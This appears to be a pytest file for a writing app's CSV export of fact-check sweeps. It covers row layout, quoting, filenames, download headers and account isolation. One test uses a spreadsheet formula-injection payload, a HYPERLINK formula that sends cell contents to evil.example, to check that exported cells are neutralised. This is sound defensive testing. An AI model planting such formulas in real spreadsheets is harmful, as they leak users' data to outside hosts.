"""A filed sweep as a spreadsheet, and the ways that goes wrong.

Every cell in this file is either a writer's own scene text or an excerpt from
the open web. Both land in a program that will execute a cell if it is allowed
to, and both contain the punctuation that breaks hand-rolled CSV.
"""

import csv
import io
from unittest import mock

from fastapi.testclient import TestClient

from star import server
from star.exports import COLUMNS, csv_filename, safe_cell, sweep_rows, sweep_to_csv
from star.store import sweep_to_document
from tests.test_scenes import AUTH, ROOM, UID, a_store, filed_room

SWEEP = {
    "room": {"title": "Doctor Who: Liverpool and Hamburg", "era": "1958-1962"},
    "claims": [
        {
            "text": "Kaiserkeller",
            "claim_type": "geography",
            "verdict": "confirmed",
            "scenes": [13, 17],
            "note": "Music venue at 36 Große Freiheit.",
            "citations": [
                {"url": "https://a.example/k", "title": "Kaiserkeller", "excerpt": "Opened 1959."},
                {"url": "https://b.example/k", "title": "Große Freiheit", "excerpt": "The street."},
            ],
        },
        {
            "text": "Ta.",
            "claim_type": "language",
            "verdict": "unverifiable",
            "scenes": [5],
            "note": "No source named.",
            "citations": [],
        },
    ],
}


def a_sweep(**overrides):
    return sweep_to_document({**SWEEP, **overrides}, "sw1", "2026-08-12T22:00:00Z")


def parsed(text):
    return list(csv.DictReader(io.StringIO(text)))


def test_a_claim_with_two_sources_is_two_rows():
    """Not one row with two urls in a cell.

    A writer opening this wants to filter on a domain, sort by verdict, and
    count how much of a draft rests on one site. A packed cell allows none of
    that.
    """
    rows = parsed(sweep_to_csv(a_sweep()))

    assert len(rows) == 3, "two sources plus one sourceless claim"
    assert [r["source_url"] for r in rows[:2]] == ["https://a.example/k", "https://b.example/k"]
    assert rows[0]["claim"] == rows[1]["claim"] == "Kaiserkeller", "sharing their claim"
    assert rows[0]["verdict"] == "confirmed"


def test_a_claim_nobody_could_answer_still_gets_a_row():
    """It is exactly the row a reader is looking for."""
    rows = parsed(sweep_to_csv(a_sweep()))
    bare = [r for r in rows if r["claim"] == "Ta."]

    assert len(bare) == 1
    assert bare[0]["source_url"] == ""
    assert bare[0]["verdict"] == "unverifiable"


def test_the_header_is_the_shape_the_importer_expects():
    rows = parsed(sweep_to_csv(a_sweep()))
    assert list(rows[0].keys()) == list(COLUMNS)
    assert "sweep_id" in COLUMNS, "so an import can find the sweep it belongs to"
    assert "scenes" in COLUMNS, "and a reader can see which pages to open"


def test_a_cell_that_would_run_as_a_formula_is_neutralised():
    """FORMULA INJECTION, and it is not hypothetical.

    Excel and Sheets have both shipped remote data exfiltration through a cell
    beginning `=`. Every cell here is a writer's own line or a page off the
    open web.
    """
    hostile = a_sweep(
        claims=[
            {
                "text": '=HYPERLINK("http://evil.example?x="&A1,"click")',
                "verdict": "confirmed",
                "scenes": [1],
                "citations": [
                    {"url": "https://x.example", "title": "@SUM(1+1)", "excerpt": "-2+3"}
                ],
            }
        ]
    )
    row = parsed(sweep_to_csv(hostile))[0]

    assert row["claim"].startswith("'="), "prefixed rather than stripped"
    assert row["source_title"].startswith("'@")
    assert row["source_excerpt"].startswith("'-")
    assert "HYPERLINK" in row["claim"], (
        "and NOT edited away — this file is read beside the draft it came from, "
        "so a writer's own line has to survive intact"
    )


def test_the_whitespace_that_slips_past_a_naive_prefix_check():
    for dangerous in ("\tSUM(1)", "\r=1+1"):
        assert safe_cell(dangerous).startswith("'"), dangerous
    for safe in ("Kaiserkeller", "1958", "", "a '61 Impala"):
        assert not safe_cell(safe).startswith("'" + safe[:1]) or safe == "", safe


def test_a_claim_full_of_punctuation_survives_the_round_trip():
    """A claim is an exact quotation from a draft. It will contain commas,
    quotes and line breaks, and hand-rolled quoting is how one of them shifts
    every column after it."""
    nasty = 'He said "INT. BUS", then, oddly,\nturned around.'
    document = a_sweep(
        claims=[{"text": nasty, "verdict": "confirmed", "scenes": [3], "citations": []}]
    )

    rows = parsed(sweep_to_csv(document))

    assert len(rows) == 1, "the newline did not become a second row"
    assert rows[0]["claim"] == nasty, "character for character"


def test_the_filename_is_something_a_writer_can_find_again():
    assert csv_filename("Doctor Who: Liverpool and Hamburg", "2026-08-12T22:00:00Z") == (
        "doctor-who-liverpool-and-hamburg-sweep-2026-08-12.csv"
    )
    assert csv_filename("", "") == "sweep-undated.csv"
    assert "/" not in csv_filename("A/B: C", "2026-08-12")


def test_rows_are_pure_and_do_not_touch_the_document():
    document = a_sweep()
    before = str(document)
    sweep_rows(document)
    assert str(document) == before


def test_the_download_is_a_file_and_not_a_page():
    """`text/csv` with an attachment disposition, never something a browser
    might render — a content type it can render is one it can execute."""
    store, _ = a_store()
    store.save(UID, ROOM, filed_room())
    store.save_sweep(UID, ROOM, "sw1", a_sweep())

    with mock.patch("star.server.verify_token", return_value=UID), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(
            f"/api/rooms/{ROOM}/sweeps/sw1.csv", headers=AUTH
        )

    assert response.status_code == 200, (
        "and the route is reachable at all: registered ABOVE /sweeps/{sweep_id}, "
        "which matches in declaration order and otherwise swallows `sw1.csv`"
    )
    assert response.headers["content-type"].startswith("text/csv")
    assert "attachment" in response.headers["content-disposition"]
    assert "doctor-who" in response.headers["content-disposition"]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "Kaiserkeller" in response.text


def test_another_accounts_sweep_has_no_csv_either():
    store, _ = a_store()
    store.save(UID, ROOM, filed_room())
    store.save_sweep(UID, ROOM, "sw1", a_sweep())

    with mock.patch("star.server.verify_token", return_value="uid-two"), \
            mock.patch("star.server._store", store):
        response = TestClient(server.app).get(
            f"/api/rooms/{ROOM}/sweeps/sw1.csv", headers=AUTH
        )

    assert response.status_code == 404
